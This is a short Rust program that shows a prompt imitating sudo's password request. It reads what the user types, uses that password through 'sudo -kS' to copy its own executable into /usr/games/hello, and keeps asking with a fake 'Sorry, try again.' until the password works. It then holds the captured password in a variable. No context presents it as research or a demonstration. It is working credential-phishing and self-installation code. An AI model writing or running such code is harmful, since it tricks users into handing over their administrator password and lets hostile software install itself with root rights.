use std::{io::Write, process::Stdio};

fn main() {
    // grabbing the path of the current running executable
    let current_exe_path = std::env::current_exe().unwrap();
    dbg!(&current_exe_path);

    // creating a buffered writer for stdout
    let mut out = std::io::BufWriter::new(std::io::stdout().lock());

    // copying the executable to the /usr/bin directory
    let pass = loop {
        write!(
            out,
            "[sudo] enter password for {}: ",
            std::env::var("USER").unwrap()
        )
        .unwrap();
        let _ = out.flush();

        let mut pass = String::new();
        std::io::stdin().read_line(&mut pass).unwrap();
        pass.pop();

        let mut child = std::process::Command::new("sudo")
            .arg("-kS")
            .args(["cp", current_exe_path.to_str().unwrap(), "/usr/games/hello"])
            .stdin(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();

        let _ = child.stdin.as_mut().unwrap().write_all(&pass.as_bytes());

        if let Ok(op) = child.wait_with_output() {
            if let Some(0) = op.status.code() {
                break pass;
            } else if let Some(1) = op.status.code() {
                writeln!(out, "Sorry, try again.").unwrap();
                continue;
            }
        }
    };
}
